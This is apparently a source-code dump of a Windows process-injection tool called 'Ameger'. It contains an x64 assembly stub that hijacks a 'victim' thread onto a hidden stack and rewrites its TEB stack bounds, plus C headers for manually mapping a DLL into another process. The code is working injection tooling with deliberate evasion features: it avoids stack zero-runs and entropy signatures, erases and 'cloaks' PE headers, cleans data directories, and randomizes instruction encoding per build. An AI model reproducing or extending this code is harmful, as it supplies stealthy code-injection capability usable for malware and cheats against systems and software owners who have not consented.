;; Dedicated shell stack, laid out after the state page in the same allocation.
;; The first 128 bytes of victim stack are still used for the register spill
;; (they hold the victim's own register values and hold no shell data), but the
;; routine and everything it calls run here.
;; Guard page sits between the state page and the shell stack, so an overflow
;; faults on PAGE_NOACCESS instead of overwriting the state page.
SR_SHELL_STACK_BASE EQU 8192
SR_SHELL_STACK_SIZE EQU 1048576
;; 16-byte aligned top, minus a 64-byte slot for the caller's shadow space.
SR_SHELL_STACK_TOP EQU 1056704

;; XCR0 components this stub is allowed to request. Bit 0 = x87, bit 1 = SSE,
;; bit 2 = AVX (YMM). AVX-512 (bits 5-7) is deliberately excluded: its XSAVE image
;; does not fit SR_FP_AREA_SIZE, and - more importantly - XRSTOR with a mask that omits
;; a component leaves that component's registers untouched, so the victim's ZMM state
;; survives simply by never being written.
SR_FP_XCR0_X87  EQU 1
SR_FP_XCR0_SSE  EQU 2
SR_FP_XCR0_AVX  EQU 4
SR_FP_XCR0_MASK EQU 7

;; XSAVE image geometry for the components above: the 64-byte XSAVE header plus the
;; 512-byte legacy region, followed by the 256-byte YMM region when AVX is requested.
SR_FP_XSAVE_LEGACY_BYTES EQU 576
SR_FP_AVX_BYTES         EQU 256

;; SR_STATE values. Kept in lockstep with SR_REMOTE_STATE in Execution/Routine/StartRoutine.h.
SR_STATE_PENDING  EQU 0
SR_STATE_RUNNING  EQU 1
SR_STATE_FINISHED EQU 2
;; Published after the routine result is stored and while the state page is still addressed:
;; the trailing pops would otherwise restore the victim RBX, so the store must precede them.
;; Reclamation stays gated on the thread's RIP being observed outside the RX code page,
;; because the return jump itself still reads the target out of the state page.
SR_STATE_EXITED   EQU 3

;; XSAVE/XRSTOR take a 64-bit feature mask in EDX:EAX. Every component this stub can
;; request lives in EAX (x87/SSE/AVX only; the mask is capped at XCR0 bits 0-2 and
;; never enables AVX-512 state); EDX must be zero because a non-zero EDX names an XCR0
;; bit that does not exist and raises #GP.
;;
;; The mask is computed *inside* the stub with XGETBV, which reads the XCR0 of the
;; thread that executes it - the victim's own XCR0, not the injector's. XCR0 is a
;; per-thread register, so reading the injector's value and replaying it would be
;; wrong whenever the two differ, and a mask that is not a subset of the victim's XCR0
;; raises #GP and kills the thread being hijacked.
;;
;; Only the REX.W forms (xsave64/xrstor64, fxsave64/fxrstor64) are emitted. Without
;; REX.W the 64-bit forms save only the low 128 bits of the XMM registers, which would
;; silently drop the victim's YMM state whenever AVX is enabled.

TEB_LAST_ERROR EQU 68H

```

### Ameger/Execution/Stub/RemoteThreadHijack.asm â€” 220 lines â€” sha12:2402A8D5FEC0
```asm
INCLUDE RemoteShell.inc

REMOTE_THREAD SEGMENT ALIGN(16) 'CODE'

PUBLIC RemoteThreadHijackBegin
PUBLIC RemoteThreadHijackEnd
PUBLIC RemoteThreadReturnTarget
PUBLIC RemoteThreadState





PUBLIC RemoteThreadLeaStateIn
PUBLIC RemoteThreadLeaStateOut
PUBLIC RemoteThreadJmpReturn
PUBLIC RemoteThreadTebReadIn
PUBLIC RemoteThreadTebReadOut
PUBLIC RemoteThreadTebWrite

IFDEF AMEGER_STUB_SEED
STUB_SEED EQU AMEGER_STUB_SEED
ELSE
.ERR <AMEGER_STUB_SEED must be provided by the build (randomized per build)>
ENDIF
;; STUB_SEED only steers encoding choices. It must never select between semantically
;; different instructions: STUB_FP_ADDR picks between two equivalent ways of forming
;; the FP area address, and STUB_RSP_CAPTURE picks between two equivalent ways of
;; reading RSP. Both are pure diversification.
STUB_FP_ADDR     EQU (STUB_SEED AND 1)
STUB_RSP_CAPTURE EQU (STUB_SEED AND 4)

RemoteThreadHijackBegin:
    pushfq
    push rax
    push rcx
    push rdx
    push rbx
    push rbp
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

RemoteThreadLeaStateIn:
    lea rbx, [RemoteThreadState]
IF STUB_RSP_CAPTURE
    lea r12, [rsp]
ELSE
    mov r12, rsp
ENDIF
    mov [rbx+SR_SAVED_RSP], r12

    ;; A5: pivot onto the dedicated shell stack before anything else runs. The
    ;; victim's free stack is never zero-filled, so no zero-run or entropy
    ;; signature is left behind; only the 17 push slots below the victim RSP
    ;; are written, and they hold the victim's own register values.
IF STUB_RSP_CAPTURE
    lea rsp, [rbx + SR_SHELL_STACK_TOP]
ELSE
    mov r10, rbx
    add r10, SR_SHELL_STACK_TOP
    mov rsp, r10
ENDIF
    mov r10, rsp
    mov [rbx+SR_SHELL_RSP], r10
    ;; A9: publish the shell stack as this thread's stack while the routine
    ;; runs. The pivot changed RSP but the TEB still describes the victim's
    ;; stack, so every consumer of the TEB bounds - __chkstk in large frames,
    ;; the exception dispatcher's exhaustion evaluation, any first-chance
    ;; handler in the target - judged stack state against a region this
    ;; thread is no longer running on. Measured 2026-10-25: the target exited
    ;; with STATUS_STACK_OVERFLOW (0xC00000FD) mid-shell until the bounds
    ;; followed the pivot.
    mov r10, gs:[08h]
    mov [rbx+SR_SAVED_STACKBASE], r10
    mov r10, gs:[10h]
    mov [rbx+SR_SAVED_STACKLIMIT], r10
    lea r10, [rbx + SR_SHELL_STACK_TOP]
    mov gs:[08h], r10
    lea r10, [rbx + SR_SHELL_STACK_BASE]
    mov gs:[10h], r10
    ;; Caller-owned shadow space for the routine being called. RSP is
    ;; 16-byte aligned here, so the call leaves the callee at 8 mod 16.
    sub rsp, 20h

IF STUB_FP_ADDR
    mov r10, rbx
    add r10, SR_FP_AREA
ELSE
    lea r10, [rbx+SR_FP_AREA]
ENDIF
    cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
    jne StubFpSaveFallback
    ;; XGETBV reads the XCR0 of whichever thread executes this stub, so the mask is
    ;; derived from the victim's own XCR0 and never from the injector's. The value the
    ;; injector staged in SR_FP_MASK is the CPU capability ceiling; the intersection
    ;; of the two is what is legal to request (anything else raises #GP).
    xor ecx, ecx
    xgetbv
    and eax, SR_FP_XCR0_MASK
    and eax, dword ptr [rbx+SR_FP_MASK]
    mov dword ptr [rbx+SR_FP_MASK], eax
    xor edx, edx
    ;; xsave64 (REX.W) is the only form that captures the full 256-bit XMM/YMM state.
    xsave64 [r10]
    jmp StubFpSaveDone
StubFpSaveFallback:
    ;; No XSAVE on this CPU: FXSAVE64 still captures the full XMM registers. The YMM
    ;; upper halves cannot be captured by FXSAVE at all, but the stub never writes them
    ;; either, so they pass through untouched.
    fxsave64 [r10]
StubFpSaveDone:

    fldcw word ptr [rbx+SR_SHELL_CW]
    ldmxcsr dword ptr [rbx+SR_SHELL_MXCSR]

    mov r15, [rbx+SR_ROUTINE]
    mov rcx, [rbx+SR_ARG]
RemoteThreadTebReadIn:
    mov r11d, gs:[TEB_LAST_ERROR]
    mov [rbx+SR_BUFFER], r11d
    mov qword ptr [rbx+SR_STATE], SR_STATE_RUNNING

    rdtsc
    shl rdx, 32
    or rax, rdx
    mov [rbx+SR_CYCLES_DELTA], rax
    mov rax, r15
    call rax
    mov [rbx+SR_RET], eax

    push rcx
    push rdx
    rdtsc
    shl rdx, 32
    or rax, rdx
    sub rax, [rbx+SR_CYCLES_DELTA]
    mov [rbx+SR_CYCLES_DELTA], rax
    pop rdx
    pop rcx
RemoteThreadTebReadOut:
    mov r11d, gs:[TEB_LAST_ERROR]
    mov [rbx+SR_LAST_ERROR], r11d
    mov r11d, [rbx+SR_BUFFER]
RemoteThreadTebWrite:
    mov gs:[TEB_LAST_ERROR], r11d
    mov qword ptr [rbx+SR_STATE], SR_STATE_FINISHED
RemoteThreadLeaStateOut:
    lea rbx, [RemoteThreadState]
    mov r12, [rbx+SR_SAVED_RSP]

IF STUB_FP_ADDR
    mov r10, rbx
    add r10, SR_FP_AREA
ELSE
    lea r10, [rbx+SR_FP_AREA]
ENDIF
    cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
    jne StubFpRestoreFallback
    ;; Reuse the mask the save phase actually used (it was narrowed against the
    ;; victim's XCR0 there); restoring with a different mask would fault or leave the
    ;; saved components unrestored.
    mov eax, dword ptr [rbx+SR_FP_MASK]
    xor edx, edx
    xrstor64 [r10]
    jmp StubFpRestoreDone
StubFpRestoreFallback:
    fxrstor64 [r10]
StubFpRestoreDone:

    ;; A9: the victim's own stack bounds go back before anything returns to
    ;; the victim's frame; the restore is placed with the other state-page
    ;; reads, ahead of the pops that reload the victim registers.
    mov r10, [rbx+SR_SAVED_STACKBASE]
    mov gs:[08h], r10
    mov r10, [rbx+SR_SAVED_STACKLIMIT]
    mov gs:[10h], r10







    ;; A5: no victim-stack scrub. The only bytes written below the victim RSP
    ;; are the 17 push slots at the top of this stub, and they hold the victim's
    ;; own register values. The shell stack is zeroed by the allocator and is
    ;; wiped by the host before this allocation is released or freed.
    mov rsp, r12
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbp
;; Publish the exit sentinel while RBX still addresses the state page; the trailing pops
;; would otherwise restore the victim RBX first. The return jump still reads the target
;; from the state page and the host reclaims the trampoline only once RIP has left the
;; RX code page, so the store must happen before RBX is consumed by the pops.
    mov qword ptr [rbx+SR_STATE], SR_STATE_EXITED
    pop rbx
    pop rdx
    pop rcx
    pop rax
    popfq
RemoteThreadJmpReturn:
    jmp qword ptr [RemoteThreadReturnTarget]

ALIGN 16
RemoteThreadState:
RemoteThreadStateFlag    DQ 0
RemoteThreadRet          DD 0
RemoteThreadPad1         DD 0
RemoteThreadLastError    DD 0
RemoteThreadPad2         DD 0
RemoteThreadArg          DQ 0
RemoteThreadRoutine      DQ 0
RemoteThreadBuffer       DQ 0
RemoteThreadFpFlags      DQ 0
RemoteThreadFpMask       DQ 0
RemoteThreadShellCw      DW 037Fh
RemoteThreadShellCwPad0  DW 0
RemoteThreadShellCwPad1  DD 0
RemoteThreadShellMxcsr   DD 01F80h
RemoteThreadShellMxPad   DD 0
RemoteThreadCyclesDelta  DQ 0
RemoteThreadShellStackTop DQ 0
RemoteThreadSavedRsp     DQ 0
RemoteThreadFpReserved   BYTE 24 DUP (0)
RemoteThreadFpArea       BYTE SR_FP_AREA_SIZE DUP (0)
RemoteThreadReturnTarget DQ 0

RemoteThreadHijackEnd:

REMOTE_THREAD ENDS

END

```

### Ameger/Injection.h â€” 72 lines â€” sha12:21E350645366
```c-header
#pragma once

#include <Windows.h>

#define AMEGER_RUNTIME_ABI_VERSION 20261024u
#include "Core/Foundation/Primitives/InjectionTypes.h"

struct MEMORY_INJECTIONDATA
{
	BYTE * RawData;
	DWORD RawSize;
	DWORD ProcessID;
	DWORD Flags;
	DWORD Timeout;
	ULONG_PTR hHandleValue;
	HINSTANCE hDllOut;
	bool GenerateErrorLog;
	DWORD TargetTid;
	ULONG_PTR hThreadHandleValue;
	const wchar_t * DllPath;
};

#define INJ_ERASE_HEADER				0x0001

#define INJ_NO_DONOR_SCAN				0x0004

#define INJ_SKIP_SPONSOR_ROUNDTRIP		0x0080

#define INJ_MM_CLEAN_DATA_DIR			0x00010000
#define INJ_MM_RESOLVE_IMPORTS			0x00020000
#define INJ_MM_RESOLVE_DELAY_IMPORTS	0x00040000
#define INJ_MM_EXECUTE_TLS				0x00080000
#define INJ_MM_ENABLE_EXCEPTIONS		0x00100000
#define INJ_MM_SET_PAGE_PROTECTIONS		0x00200000
#define INJ_MM_INIT_SECURITY_COOKIE		0x00400000
#define INJ_MM_RUN_DLL_MAIN				0x00800000

#define INJ_MM_RUN_UNDER_LDR_LOCK		0x01000000

#define INJ_MM_MAP_FROM_MEMORY		0x04000000

using f_Memory_Inject = DWORD(__stdcall*)(MEMORY_INJECTIONDATA * pData);

using f_GetSymbolState = DWORD(__stdcall *)();
using f_GetImportState = DWORD(__stdcall *)();
using f_InitializeRuntime = DWORD(__stdcall *)();
using f_ShutdownRuntime = DWORD(__stdcall *)();

using f_StartDownload = void(__stdcall *)();
using f_GetLastHijackStats = void(__stdcall *)(HijackStats * ProcessOut, HijackStats * ThreadOut);
using f_GetLastMapStats = void(__stdcall *)(MAP_STATS * Out);
using f_GetLastStringStats = void(__stdcall *)(STRING_STATS * Out);
using f_GetLastThreadExecStats = void(__stdcall *)(THREAD_EXEC_STATS * Out);
using f_GetLastExecTelemetry = void(__stdcall *)(VERIFIABLE_EXEC_TELEMETRY * Out);

using f_raw_print_callback = void(__stdcall *)(const char * szText);
using f_SetRawPrintCallback = DWORD(__stdcall *)(f_raw_print_callback callback);

struct LAST_ERROR_INFO
{
	DWORD	ErrorCode;
	DWORD	AdvErrorCode;
	int		Line;
	DWORD	Flags;
	int		bNative;
	wchar_t	DllFileName[MAX_PATH];
	wchar_t	TargetProcessExeFileName[MAX_PATH];
};
static_assert(sizeof(LAST_ERROR_INFO) % 4 == 0, "LAST_ERROR_INFO must stay 4-byte aligned");

using f_GetLastErrorInfo = DWORD(__stdcall *)(LAST_ERROR_INFO * Out);
using f_GetRuntimeAbiVersion = DWORD(__stdcall *)();
using f_ClearLastErrorInfo = DWORD(__stdcall *)();
DWORD __stdcall GetLastErrorInfo(LAST_ERROR_INFO * Out);
DWORD __stdcall GetRuntimeAbiVersion();

DWORD __stdcall ClearLastErrorInfo();

DWORD __stdcall InitializeRuntime();
DWORD __stdcall ShutdownRuntime();
void __stdcall GetLastHijackStats(HijackStats * ProcessOut, HijackStats * ThreadOut);
void __stdcall GetLastMapStats(MAP_STATS * Out);
void __stdcall GetLastStringStats(STRING_STATS * Out);
void __stdcall GetLastThreadExecStats(THREAD_EXEC_STATS * Out);
void __stdcall GetLastExecTelemetry(VERIFIABLE_EXEC_TELEMETRY * Out);

void ResetHijackStats();
void ResetMapStats();
void ResetThreadExecStats();
void ResetExecTelemetry();

```

### Ameger/Injection/Injection.h â€” 22 lines â€” sha12:40A75CDAACF2
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"

#include "../Injection.h"

#include <string>

DWORD __stdcall Memory_Inject(MEMORY_INJECTIONDATA * pData);

DWORD __stdcall GetSymbolState();

DWORD __stdcall GetImportState();

struct INJECTIONDATA_INTERNAL
{
	std::wstring	DllPath;
	std::wstring	TargetProcessExeFileName;

	BYTE *			RawData;
	DWORD			RawSize;

	DWORD			ProcessID;
	DWORD			Flags;
	DWORD			Timeout;
	ULONG_PTR		hHandleValue;
	bool			GenerateErrorLog;
	DWORD			TargetTid;
	ULONG_PTR		hThreadHandleValue;

	INJECTIONDATA_INTERNAL(const MEMORY_INJECTIONDATA	* pData);
};

```

### Ameger/Injection/ManualMapping/ManualMappingCore.h â€” 9 lines â€” sha12:7841749611E1
```c-header
#pragma once

#include "Core/Utility/Header/PrecompiledHeader.h"
#include "Core/Foundation/Error.h"
#include "Core/Utility/Tools/Tools.h"
#include "Injection/ManualMapping/ManualMappingInternal.h"

namespace MMAP_NATIVE
{
	DWORD ManualMap(const INJECTION_SOURCE & Source, HANDLE hTargetProc, DWORD Flags, HINSTANCE & hOut, DWORD Timeout, ULONG_PTR SponsorThread, DWORD SponsorTid, ERROR_DATA & error_data);
}

```

### Ameger/Injection/ManualMapping/ManualMappingInternal.h â€” 399 lines â€” sha12:F2BF1F045487
```c-header
#pragma once

#include <cstdint>

#include "Native/Syscall.h"

#include "System/Import/ImportHandler.h"
#include "System/Symbol/Offsets/DynamicOffsets.h"
#include "../../Injection.h"
#include "Execution/Routine/StartRoutine.h"

#define RELOC_FLAG64(RelInfo) ((RelInfo >> 0x0C) == IMAGE_REL_BASED_DIR64)

#define RELOC_FLAG RELOC_FLAG64

#define MM_MAX_CACHED_SECTIONS 96

namespace MMAP_NATIVE
{
	struct MANUAL_MAPPING_DATA;
	struct MANUAL_MAPPING_FUNCTION_TABLE;
}

using f_DLL_ENTRY_POINT = BOOL(WINAPI *)(HINSTANCE hDll, DWORD dwReason, void * pReserved);

using f_MMI_FUNCTION = DWORD(__stdcall *)(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);

typedef struct _MM_DEPENDENCY_RECORD
{
	struct _MM_DEPENDENCY_RECORD * Next = nullptr;
	struct _MM_DEPENDENCY_RECORD * Prev = nullptr;

	HANDLE DllHandle = nullptr;
} MM_DEPENDENCY_RECORD;

DWORD __declspec(code_seg(".code$01")) __stdcall ManualMapping_Shell		(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$05")) __stdcall MMI_SetExecProtections	(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData, DWORD NewState);
bool	__declspec(code_seg(".code$11")) __stdcall MMI_FindLoadedModule	(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData, const UNICODE_STRING * FullName, HINSTANCE * hModule);
DWORD __declspec(code_seg(".code$06")) __stdcall MMI_LoadImports			(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$07")) __stdcall MMI_LoadDelayImports		(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$08")) __stdcall MMI_SetPageProtections		(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$09")) __stdcall MMI_EnableExceptions		(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$0A")) __stdcall MMI_HandleTLS				(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$0F")) __stdcall MMI_RunTlsCallbacks		(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$0B")) __stdcall MMI_ExecuteDllMain			(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$0C")) __stdcall MMI_CleanDataDirectories	(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$0D")) __stdcall MMI_CloakHeader			(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);
DWORD __declspec(code_seg(".code$0E")) __stdcall MMI_CleanUp				(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData);

// A6: OutputDebugString raises DBG_PRINTEXCEPTION_C on current builds even
// without a debugger. A normal thread absorbs that raise in its top-level
// handler frame; the hijacked thread has no such frame on its synthetic stack,
// so the raise would terminate the target. This handler resumes execution for
// the two debug-print codes and passes everything else through. It is copied
// with the rest of the shell and therefore must not call anything outside it.
LONG __declspec(code_seg(".code$10")) __stdcall MMI_DebugPrintVeh			(PEXCEPTION_POINTERS ExceptionInfo);

NTSTATUS __declspec(code_seg(".code$12")) __stdcall MMIH_PreprocessModuleName(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData, const char * szModule, UNICODE_STRING * ModuleName, LDRP_LOAD_CONTEXT_FLAGS * CtxFlags);
NTSTATUS __declspec(code_seg(".code$13")) __stdcall MMIH_LoadModule(MMAP_NATIVE::MANUAL_MAPPING_DATA * pData, UNICODE_STRING * Module, LDRP_LOAD_CONTEXT_FLAGS CtxFlag, HINSTANCE * hModule, MM_DEPENDENCY_RECORD ** head);

DWORD __declspec(code_seg(".code$14")) MMAP_SEC_END();

#define MM_EXEC_STATE_MAPPABLE	0
#define MM_EXEC_STATE_EXECUTE	1
#define MM_EXEC_STATE_WRITABLE	2

namespace MMAP_NATIVE
{
	using namespace NATIVE;

	ALIGN struct MANUAL_MAPPING_FUNCTION_TABLE
	{
	ALIGN NT_FUNC_LOCAL(NtQueryInformationProcess);

	ALIGN NT_FUNC_LOCAL(NtAllocateVirtualMemory);
		ALIGN NT_FUNC_LOCAL(NtProtectVirtualMemory);
		ALIGN NT_FUNC_LOCAL(NtFreeVirtualMemory);
		ALIGN NT_FUNC_LOCAL(NtSetEvent);
		ALIGN NT_FUNC_LOCAL(NtClose);

		ALIGN NT_FUNC_LOCAL(memmove);
		ALIGN NT_FUNC_LOCAL(RtlZeroMemory);
		ALIGN NT_FUNC_LOCAL(RtlAllocateHeap);
		ALIGN NT_FUNC_LOCAL(RtlFreeHeap);

		ALIGN NT_FUNC_LOCAL(LdrpLoadDllInternal);
		ALIGN NT_FUNC_LOCAL(LdrGetProcedureAddress);

		ALIGN NT_FUNC_LOCAL(LdrUnloadDll);

		ALIGN NT_FUNC_LOCAL(RtlAnsiStringToUnicodeString);

		ALIGN NT_FUNC_LOCAL(LdrpPreprocessDllName);
		ALIGN NT_FUNC_LOCAL(RtlInsertInvertedFunctionTable);
		ALIGN NT_FUNC_LOCAL(RtlAddFunctionTable);
		ALIGN NT_FUNC_LOCAL(RtlLookupFunctionEntry);

		ALIGN NT_FUNC_LOCAL(RtlDeleteFunctionTable);
		ALIGN NT_FUNC_LOCAL(RtlAddVectoredExceptionHandler);
		ALIGN NT_FUNC_LOCAL(RtlRemoveVectoredExceptionHandler);
		ALIGN NT_FUNC_LOCAL(LdrpHandleTlsData);

		ALIGN NT_FUNC_LOCAL(LdrLockLoaderLock);
		ALIGN NT_FUNC_LOCAL(LdrUnlockLoaderLock);

		ALIGN NT_FUNC_LOCAL(LdrpDereferenceModule);

		ALIGN NT_FUNC_LOCAL(LdrProtectMrdata);

		ALIGN NT_FUNC_LOCAL(LdrpHeap);
		ALIGN NT_FUNC_LOCAL(LdrpInvertedFunctionTable);
		ALIGN NT_FUNC_LOCAL(LdrpTlsList);

		// A10: the TLS API the registration goes through. ntdll exports.
		ALIGN NT_FUNC_LOCAL(TlsAlloc);
		ALIGN NT_FUNC_LOCAL(TlsSetValue);
		ALIGN NT_FUNC_LOCAL(TlsFree);

		ALIGN f_MMI_FUNCTION MMP_Shell					= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_LoadImports			= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_LoadDelayImports		= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_SetPageProtections	= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_EnableExceptions		= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_HandleTLS				= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_RunTlsCallbacks		= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_ExecuteDllMain		= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_CleanDataDirectories	= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_CloakHeader			= nullptr;
		ALIGN f_MMI_FUNCTION MMIP_CleanUp				= nullptr;

		ALIGN decltype(MMIH_PreprocessModuleName)		* MMIHP_PreprocessModuleName		= nullptr;
		ALIGN decltype(MMIH_LoadModule)					* MMIHP_LoadModule					= nullptr;

		MANUAL_MAPPING_FUNCTION_TABLE();

		bool IsValid() const
		{
			return NtAllocateVirtualMemory && NtProtectVirtualMemory && NtFreeVirtualMemory && NtSetEvent && NtClose &&
			memmove && RtlZeroMemory && RtlAllocateHeap && RtlFreeHeap &&
			LdrpLoadDllInternal && LdrGetProcedureAddress && LdrUnloadDll &&
			RtlAnsiStringToUnicodeString &&
			LdrpPreprocessDllName &&
			RtlAddFunctionTable && LdrpHandleTlsData &&
			RtlAddVectoredExceptionHandler && RtlRemoveVectoredExceptionHandler &&
			LdrLockLoaderLock && LdrUnlockLoaderLock &&
			LdrpDereferenceModule &&
			TlsAlloc && TlsSetValue && TlsFree &&
			LdrpHeap && LdrpTlsList;
		}
	};

 	ALIGN struct MANUAL_MAPPING_DATA
 	{
 		ALIGN HINSTANCE	hRet		= NULL;
 		ALIGN HANDLE	CompletionEvent = nullptr;
		// A3: a bare `ret` inside ntdll, located by the host in this process's
		// copy. The target's ntdll sits at the same verified base, so the
		// address is valid there too. OutputDebugStringA/W imports are pointed
		// at it so the payload's own debug-print calls never raise.
		ALIGN PVOID		OdsReturnStub = nullptr;
		// A3: the first-chance net for debug-print exceptions raised by code
		// the redirect cannot cover - a freshly loaded dependency's internal
		// OutputDebugString on the synthetic stack. Measured 2026-10-25:
		// notepad exited with DBG_PRINTEXCEPTION_C (0x40010006) when the
		// shell loaded D3DCOMPILER_47 and only the redirect was in place.
		ALIGN PVOID		DebugPrintVehHandle = nullptr;
 		ALIGN DWORD		Flags		= NULL;
		// The host-validated OS build. The shell uses it to select the
		// exception-table encoding that this build family actually stores.
		ALIGN DWORD		OSBuildNumber	= 0;
 		ALIGN NTSTATUS	ntRet		= STATUS_SUCCESS;

 		ALIGN void				*	pFakeSEHDirectory	= nullptr;

 		ALIGN RUNTIME_FUNCTION	*	pDynamicFunctionTable	= nullptr;

 		ALIGN DWORD	InvertedTableInstalled = 0;

	ALIGN BYTE *	pAllocationBase	= nullptr;
	ALIGN BYTE *	pImageBase		= nullptr;

 	ALIGN IMAGE_DOS_HEADER		* pDosHeader		= nullptr;
 		ALIGN IMAGE_NT_HEADERS		* pNtHeaders		= nullptr;
 		ALIGN IMAGE_OPTIONAL_HEADER	* pOptionalHeader	= nullptr;
 		ALIGN IMAGE_FILE_HEADER		* pFileHeader		= nullptr;

 		ALIGN MM_DEPENDENCY_RECORD * pImportsHead		= nullptr;
 		ALIGN MM_DEPENDENCY_RECORD * pDelayImportsHead	= nullptr;

 		ALIGN MAP_STATS MapStats{};

 		ALIGN MANUAL_MAPPING_FUNCTION_TABLE * FunctionTable = nullptr;

 		ALIGN DYNAMIC_NT_OFFSETS NtOffsets{};
		// The offsets that were resolved from the live ntdll. The shell uses
		// them instead of the compile-time guesses, so a loader layout change
		// does not break the mapping.
		ALIGN DWORD ExecProtectionState = MM_EXEC_STATE_MAPPABLE;
		// Tracks whether the executable sections are currently execute-read or
		// writable, so the stages do not have to re-apply the protection.
		ALIGN DWORD		TlsCallbackIndex	= 0;
		ALIGN ULONG_PTR	TlsCallbackAddress	= 0;
		// The callback that was rejected and where it pointed, so the launcher
		// can report why the TLS stage stopped.
		ALIGN DWORD					CachedSizeOfImage	= 0;
		ALIGN DWORD					CachedSizeOfHeaders	= 0;
		ALIGN DWORD					CachedEntryPoint	= 0;
		ALIGN DWORD					CachedSectionCount	= 0;
		ALIGN IMAGE_SECTION_HEADER	CachedSections[MM_MAX_CACHED_SECTIONS]{};
		ALIGN IMAGE_DATA_DIRECTORY	CachedDataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]{};
		// A10: what the TLS registration set and what a failure unwind has to
		// give back. TlsDirectory hands the directory from the setup stage to
		// the callback stage; TlsIndexAddress caches the in-image _tls_index
		// location because MMI_CleanDataDirectories zeroes the directory
		// before MMI_CleanUp runs, and the unwind must not depend on a wiped
		// struct; TlsIndex is the TlsAlloc slot patched into the image's
		// _tls_index; TlsIndexPrior is that variable's pre-patch value;
		// TlsBlock/TlsBlockSize are the template block on the loader heap that
		// this thread's slot points at.
 		ALIGN void *	TlsDirectory	= nullptr;
		ALIGN DWORD *	TlsIndexAddress	= nullptr;
		ALIGN DWORD	TlsIndex		= 0;
		ALIGN DWORD	TlsIndexPrior	= 0;
		ALIGN void *	TlsBlock		= nullptr;
		ALIGN DWORD	TlsBlockSize	= 0;
		// Everything the shell learned about its own execution is copied back
		// into this block for the host to read.
 		ALIGN VERIFIABLE_EXEC_TELEMETRY ExecTelemetry{};

 		ALIGN DWORD SectionProtCount = 0;
  	};
}

__forceinline DWORD64 MMI_RotateRight64(DWORD64 Value, unsigned Count)
{
	constexpr unsigned kBits = sizeof(DWORD64) * 8u;
	const unsigned Shift = Count & (kBits - 1u);

	if (!Shift)
	{
		return Value;
	}

	return (Value >> Shift) | (Value << (kBits - Shift));
}

#pragma region inlined helper functions

__forceinline void * MMI_LdrpHeap(MMAP_NATIVE::MANUAL_MAPPING_FUNCTION_TABLE * f)
{
	if (!f || !f->LdrpHeap)
	{
		return nullptr;
	}

	return *f->LdrpHeap;
}

template <class T>
__forceinline T * NewObject(MMAP_NATIVE::MANUAL_MAPPING_FUNCTION_TABLE * f, size_t Count = 1)
{
	void * heap = MMI_LdrpHeap(f);
	if (!f || !f->RtlAllocateHeap || !heap || !Count || sizeof(T) > (SIZE_MAX) / Count)
	{
		return nullptr;
	}

	return ReCa<T *>(f->RtlAllocateHeap(heap, HEAP_ZERO_MEMORY, sizeof(T) * Count));
}

__forceinline void * NewBytes(MMAP_NATIVE::MANUAL_MAPPING_FUNCTION_TABLE * f, SIZE_T Size)
{
	void * heap = MMI_LdrpHeap(f);
	if (!f || !f->RtlAllocateHeap || !heap || !Size || Size > 0x10000)
	{
		return nullptr;
	}

	return f->RtlAllocateHeap(heap, HEAP_ZERO_MEMORY, Size);
}

__forceinline void WritePtrField(void * Base, DWORD Off, void * Value)
{
	*ReCa<void **>(ReCa<BYTE *>(Base) + Off) = Value;
}

__forceinline void * ReadPtrField(const void * Base, DWORD Off)
{
	return *ReCa<void * const *>(ReCa<const BYTE *>(Base) + Off);
}

__forceinline IMAGE_SECTION_HEADER * MMI_Sections(const MMAP_NATIVE::MANUAL_MAPPING_DATA * pData)
{
	if (pData->Flags & INJ_ERASE_HEADER)
	{
		return const_cast<IMAGE_SECTION_HEADER *>(pData->CachedSections);
	}

	return IMAGE_FIRST_SECTION(pData->pNtHeaders);
}

__forceinline DWORD MMI_SectionCount(const MMAP_NATIVE::MANUAL_MAPPING_DATA * pData)
{
	if (pData->Flags & INJ_ERASE_HEADER)
	{
		return pData->CachedSectionCount;
	}

	return pData->pFileHeader->NumberOfSections;
}

__forceinline IMAGE_DATA_DIRECTORY * MMI_DataDirectory(const MMAP_NATIVE::MANUAL_MAPPING_DATA * pData)
{
	if (pData->Flags & INJ_ERASE_HEADER)
	{
		return const_cast<IMAGE_DATA_DIRECTORY *>(pData->CachedDataDirectory);
	}

	return pData->pOptionalHeader->DataDirectory;
}

__forceinline DWORD MMI_SizeOfImage(const MMAP_NATIVE::MANUAL_MAPPING_DATA * pData)
{
	if (pData->Flags & INJ_ERASE_HEADER)
	{
		return pData->CachedSizeOfImage;
	}

	return pData->pOptionalHeader->SizeOfImage;
}

